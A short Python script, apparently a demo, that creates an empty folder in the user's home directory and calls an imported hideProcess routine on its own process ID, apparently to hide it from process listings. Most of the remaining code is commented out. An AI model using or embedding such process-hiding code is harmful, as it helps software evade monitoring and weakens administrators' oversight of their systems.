import os
import time
from hideProcess import hideProcess
from createProcess import createProcess
from showProcess import showProcess


def process():
        # create an empty folder in home folder
        username = os.environ["USER"]
        os.system("mkdir /home/{}/empty".format(username))

        PID_APP = os.getpid()

        # Hide Main App Process
        hideProcess(PID_APP, username)
        current_time = time.time()
       # while 1:
            # print counter in seconds
            #print("Counter: ", int(time.time()%current_time), end="\r")

        # Pause 10 seconds ...
       # print('Pause 20 seconds before showing subprocess ...')
        ##time.sleep(20)

        # Show "sleep" Process
        #print('You can see the subprocess now')
        #showProcess(PID_PROCESS)